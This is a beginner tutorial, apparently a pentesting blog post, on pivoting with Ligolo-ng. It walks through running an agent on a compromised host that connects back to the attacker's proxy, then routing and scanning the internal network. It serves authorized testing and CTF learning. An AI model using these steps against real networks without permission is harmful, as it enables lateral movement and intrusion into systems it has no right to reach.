---
title: "Ligolo-ng for Beginners: Pivoting That Feels Like a VPN"
description: "A beginner-friendly guide to Ligolo-ng — what it actually does, how to install it, and how to run your first pivot without ever touching proxychains."
tags:
  - ligolo-ng
  - pivoting
  - networking
  - beginner
  - tools
draft: false
date: 2026-07-28
---

You popped a box. Nice. You've got a shell on some internal server, you run `ipconfig`, and you notice it's sitting on a second network — `10.10.20.0/24` — that you can't reach from your attacker machine. That's where the good stuff usually lives: domain controllers, file shares, admin panels.

The problem: your Kali box has no route to that network. The only thing that *can* reach it is the machine you just compromised.

This is the **pivoting** problem, and **Ligolo-ng** is one of the cleanest tools out there for solving it.

## What Ligolo-ng actually does

Most pivoting tools historically dumped you into SOCKS-proxy-and-`proxychains` territory. That works, but it's clunky: you have to prefix every command with `proxychains`, a lot of tools behave weirdly through it, and anything using raw sockets (like default `nmap`) tends to break.

Ligolo-ng takes a different approach. Instead of a SOCKS proxy, it creates a virtual network interface (a **TUN interface**) on your attacker machine. Once it's running, that compromised network just *shows up* on your box like any other route. You run `nmap`, `curl`, your browser, whatever — pointed straight at `10.10.20.0/24` — with **no proxychains, no wrapper commands**. It behaves like you're connected to a VPN into the target network.

Under the hood it does this by building a userland network stack (using [gVisor](https://gvisor.dev/)) that translates packets sent to the TUN interface into ordinary connections made *from* the compromised host. You don't need to understand that to use it — just know that's why it feels so seamless.

### The two pieces: proxy and agent

Ligolo-ng has exactly two components, and it's worth getting them straight from the start because beginners mix them up constantly:

- **`proxy`** → runs on **your attacker machine** (your Kali / C2 box). This is the part you interact with. It gives you the console where you type commands.
- **`agent`** → runs on the **compromised target**. It's the thing you drop onto the victim and execute. It "phones home" to your proxy.

A handy way to remember it: the **agent** is your operative behind enemy lines, and the **proxy** is you back at headquarters running the show. The agent connects *out* to you (a reverse connection), which is great because outbound traffic is usually less filtered than inbound.

One more nice detail: **the agent needs no admin/root privileges on the target.** The only place you need elevated rights is your own attacker box, to create the TUN interface.

## Installing Ligolo-ng

You don't need to compile anything. The project ships precompiled binaries for Linux, Windows, macOS, and BSD.

Head to the releases page and grab the **latest** version (as of this writing that's **v0.8.3**):

> https://github.com/nicocha30/ligolo-ng/releases

You need **two different binaries**:

1. The **proxy** build for *your* OS (probably Linux).
2. The **agent** build for the *target's* OS (Linux agent for a Linux victim, Windows agent for a Windows victim, etc.).

On your attacker machine:

```bash
# Download and extract the proxy (adjust the version/filename to the latest release)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz
tar -xvzf ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz

# Download the Linux agent to deliver to your target later
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_agent_0.8.3_linux_amd64.tar.gz
tar -xvzf ligolo-ng_agent_0.8.3_linux_amd64.tar.gz
```

That leaves you with a `proxy` binary (for you) and an `agent` binary (to transfer to the victim).

> **Windows targets:** the agent needs the `wintun.dll` driver (the same one WireGuard uses) sitting in the same folder as the agent binary. Download it from [wintun.net](https://www.wintun.net/) and match the architecture (amd64/arm64).

## Running your first pivot

Here's the full flow, start to finish. I'll use self-signed certificates, which is the easiest path for a lab or CTF.

### Step 1 — Start the proxy on your attacker box

```bash
sudo ./proxy -selfcert
```

`-selfcert` tells Ligolo to generate its own TLS certificate so you don't need Let's Encrypt or your own certs. You'll land in the Ligolo console:

```
ligolo-ng »
```

While you're here, grab the certificate fingerprint — you'll hand it to the agent so it trusts your proxy:

```
ligolo-ng » certificate_fingerprint
INFO[0203] TLS Certificate fingerprint for ligolo is: D005527D2683A8F2...B692E0FC
```

Copy that long hex string.

### Step 2 — Deliver and run the agent on the target

Get the `agent` binary onto the compromised host (however you'd normally transfer a file — a Python web server and `wget`, SMB, etc.), then run it:

```bash
./agent -connect YOUR_ATTACKER_IP:11601 -accept-fingerprint D005527D2683A8F2...B692E0FC
```

- `-connect` points at your proxy. Port **11601** is Ligolo's default.
- `-accept-fingerprint` is the string you copied in Step 1, so the agent knows it's talking to *your* proxy and not a man-in-the-middle.

> **Lab shortcut:** if you're just messing around in a safe test environment and don't want to bother with fingerprints, you can run the agent with `-ignore-cert` instead. **Never do this on a real engagement** — it disables the check that stops someone hijacking your tunnel.

Back on your proxy, you'll see the agent check in:

```
INFO[0102] Agent joined. name=victim@target remote="10.10.10.5:38000"
```

### Step 3 — Select the session

Tell the proxy which agent you want to work with:

```
ligolo-ng » session
? Specify a session : 1 - victim@target - 10.10.10.5:38000
```

Pick it, and your prompt changes to show you're now "attached" to that agent:

```
[Agent : victim@target] »
```

### Step 4 — Create the TUN interface and start the tunnel

Older guides tell you to manually run `ip tuntap` commands. You don't need to anymore — Ligolo can make the interface for you:

```
[Agent : victim@target] » interface_create --name ligolo
INFO[3185] Creating a new "ligolo" interface...
INFO[3185] Interface created!
```

Then start the tunnel over that interface:

```
[Agent : victim@target] » tunnel_start --tun ligolo
INFO[0690] Starting tunnel to victim@target
```

The tunnel is now live — but your machine still doesn't know *which* networks to send down it. That's the last step.

### Step 5 — Add a route

First, ask the agent what networks it can see:

```
[Agent : victim@target] » ifconfig
```

Look through the output for that second network you spotted earlier — say the agent has an IP of `10.10.20.5/24`. That tells you the target network is `10.10.20.0/24`.

Now route that subnet down the tunnel:

```
[Agent : victim@target] » interface_add_route --name ligolo --route 10.10.20.0/24
INFO[3206] Route created.
```

That's it. **Your attacker machine can now talk to `10.10.20.0/24` directly.**

### Step 6 — Use it like a normal network

Open a *regular* terminal on your attacker box — no proxychains, no wrappers:

```bash
nmap 10.10.20.0/24 -sV -n -PE
```

Point your browser at an internal web app, RDP into a host, run BloodHound collection, whatever you need. As far as your tools are concerned, that internal network is just… there.

> **`nmap` pro tip:** because the agent runs unprivileged, it can't forward raw packets. For scanning through the tunnel, add `-PE` (or `--unprivileged`) so `nmap` uses TCP connects instead of raw SYN probes — otherwise you'll get false results.

## Quick troubleshooting

- **Agent connects but nothing routes.** You almost certainly skipped `tunnel_start` or `interface_add_route`. The tunnel and the route are two separate steps.
- **`nmap` says everything is up / everything is down.** Add `-PE` or `--unprivileged`. This is the single most common Ligolo gotcha.
- **Agent won't connect at all.** Check that port `11601` is actually reachable from the target to you (firewalls, cloud security groups), and that you're using your *reachable* IP, not `127.0.0.1`.
- **Fingerprint rejected.** Re-copy it — it's easy to grab an extra space or miss a character. Or use `-ignore-cert` *in a lab only* to confirm the rest of your setup works.

## Where to go next

Once the basic single-hop pivot clicks, Ligolo-ng has a lot more to offer: chaining pivots to go *two* networks deep, `listener` commands to forward specific ports back to yourself (great for catching reverse shells from deep inside a target network), a config file to save your setup, and even a web interface for team/multiplayer use added in the 0.8 release.

But that first pivot — proxy up, agent home, interface, tunnel, route — is the core loop. Get comfortable with those six steps and you'll reach for Ligolo-ng every time you need to go deeper than your foothold.

---

*A reminder from all of us at Ping-Sec: pivoting tools are for authorized engagements and lab environments only. Only run this against systems you have explicit, written permission to test.*
